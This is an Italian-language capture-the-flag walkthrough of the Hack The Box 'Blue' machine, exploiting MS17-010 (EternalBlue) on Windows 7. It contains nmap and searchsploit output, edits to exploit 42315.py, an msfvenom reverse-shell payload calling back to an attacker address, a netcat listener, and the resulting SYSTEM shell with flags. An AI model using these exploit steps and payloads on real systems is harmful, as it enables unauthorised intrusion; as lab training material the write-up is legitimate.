**Author: Noto La Diega Alessandro**

**TARGET:10.10.10.40**

# INFORMATION GATHERING

iniziamo con un semplice scan di [[Nmap]]

```bash
iniziamo con un semplcie scan di [[Nmap]]
┌──(root㉿kali)-[/home/kali/htb/blue]
└─# nmap -sC -sV 10.10.10.40
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-28 17:14 EDT
Nmap scan report for 10.10.10.40
Host is up (0.054s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   210:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2023-05-28T21:15:56
|_  start_date: 2023-05-28T21:12:30
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-05-28T22:15:55+01:00
|_clock-skew: mean: -19m51s, deviation: 34m35s, median: 6s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.66 seconds```

Un scan su tutte le porte non evidezia nessuna nuova porta aperta, quindi ci concetriamo su queste :

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
[[Port 139 Netbios|139]]/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)

# ENUMERATION

Proviamo a vedere sempre con Nmap se abbiamo qualche vulnerabilità nota

```bash
┌──(root㉿kali)-[/home/kali/htb/blue]
└─# nmap --script vuln 10.10.10.40
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-28 17:41 EDT
Nmap scan report for 10.10.10.40
Host is up (0.042s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND

Nmap done: 1 IP address (1 host up) scanned in 113.02 seconds
```

Abbiamo una vulnerabilità!

## MS 17-010 

Abbiamo già visto questa vulnerabilità nella macchina [[Legacy#**MS17-010|Legacy]]

```bash
┌──(root㉿kali)-[/home/kali/htb/blue]
└─# searchsploit MS17-010
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Rem | windows/remote/43970.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)   | windows/dos/41891.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010 | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution | windows_x86-64/remote/42030.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execut | windows_x86-64/remote/41987.py
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Compiamo il 42315.py che sembrerebbe fare al caso nostro e gli diamo un occhiata
```bash
┌──(root㉿kali)-[/home/kali/htb/blue]                                                                             
└─# searchsploit -m 42315.py                                                                                      
  Exploit: Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)   
      URL: https://www.exploit-db.com/exploits/42315                                                              
     Path: /usr/share/exploitdb/exploits/windows/remote/42315.py                                                  
    Codes: CVE-2017-0144                                                                                          
 Verified: True                                                                                                   
File Type: Python script, ASCII text executable                                                                   
Copied to: /home/kali/htb/blue/42315.py                                          
```

Dopo aver esaminato il codice sorgente, dobbiamo fare tre cose:
- Scaricare  mysmb.py poiché l'exploit lo importa. Il percorso di download è incluso nell'exploit.
- Usare  MSFvenom per creare un payload della shell inversa (consentito su OSCP fintanto che non stai usando meterpreter).
- Apporta modifiche all'exploit per aggiungere le credenziali di autenticazione e il payload della shell inversa.

Avevo già [[Legacy#^a32b2b|mysmb.py]] in quanto l'avevamo gia usato un altra macchina [[Legacy]] lo copiamo nella directory corrente 

con enum4linux possiamo vedere che l'accesso guest è supportato.

```bash
┌──(root㉿kali)-[/home/kali/tool/PrivEsc/LinEnum]
└─# enum4linux 10.10.10.40
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue May 30 09:39:05 2023

 =========================================( Target Information )=========================================

Target ........... 10.10.10.40
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
```

Modifichimao il l'exploit come segue per testasre se risuciamo ad scrivre sulla macchina target
```python2
USERNAME = 'guest'
PASSWORD = ''
```

Lanciamo l'exploit per esegurie un test 

```bash
┌──(root㉿kali)-[/home/kali/htb/blue]
└─# python2 42315.py 10.10.10.40
Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: samr
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8003602260
SESSION: 0xfffff8a00bf8eca0
FLINK: 0xfffff8a012830088
InParam: 0xfffff8a01282a15c
MID: 0xc03
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
creating file c:\pwned.txt on the target
Done
```

Funziona non ci resta che creare la revshell come segue:

```bash
┌──(root㉿kali)-[/home/kali/htb/blue]
└─# msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.9 LPORT=4444 > eternal-blue.exe
```

Modifichiamo ancora l'exploit

```python2
def smb_pwn(conn, arch):
        smbConn = conn.get_smbconnection()

        print('creating file c:\\pwned.txt on the target')
        tid2 = smbConn.connectTree('C$')
        fid2 = smbConn.createFile(tid2, '/pwned.txt')
        smbConn.closeFile(tid2, fid2)
        smbConn.disconnectTree(tid2)

        smb_send_file(smbConn, '/home/kali/htb/blue/eternal-blue.exe', 'C', '/eternal-blue.exe')
        service_exec(conn, r'cmd /c C:\eternal-blue.exe')
        # Note: there are many methods to get shell over SMB admin session
        # a simple method to get shell (but easily to be detected by AV) is
        # executing binary generated by "msfvenom -f exe-service ..."
```

Ci mettiamo in ascolto con nc 

```bash
┌──(root㉿kali)-[/home/kali/htb/blue]
└─# nc -lnvp 4444    
listening on [any] 4444 ...
```

Siamo pronti a lancire l'exploit

```bash
┌──(root㉿kali)-[/home/kali/htb/blue]
└─# python2 42315.py 10.10.10.40
Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: samr
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8002bdbba0
SESSION: 0xfffff8a012828660
FLINK: 0xfffff8a00805a048
InParam: 0xfffff8a00809915c
MID: 0x1807
unexpected alignment, diff: 0x-3ffb8
leak failed... try again
CONNECTION: 0xfffffa8002bdbba0
SESSION: 0xfffff8a012828660
FLINK: 0xfffff8a0080ab088
InParam: 0xfffff8a0080a515c
MID: 0x1803
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
creating file c:\pwned.txt on the target
Opening SVCManager on 10.10.10.40.....
Creating service zQeE.....
Starting service zQeE.....
The NETBIOS connection with the remote host timed out.
Removing service zQeE.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
```

Otteniamo cosi un shell con i massimi privilegi 

```
┌──(root㉿kali)-[/home/kali/htb/blue]
└─# nc -lnvp 4444    
listening on [any] 4444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.40] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system


C:\Users\haris\Desktop>type user.txt
type user.txt
2333342657b9923bb22b8357c1882967

C:\Users\Administrator\Desktop>type root.txt
type root.txt
3ae93528ed62070e46f568dca7fa787d

```

# LESSON LEARNED

Bisogna aggiornare sempre i sistemi, specialmente quando vengono rilasciati aggiornamenti per vulnerabilità critiche! Se l'amministratore di sistema avesse installato l'aggiornamento di sicurezza MS17–010, avrei dovuto trovare un altro modo per sfruttare questa macchina.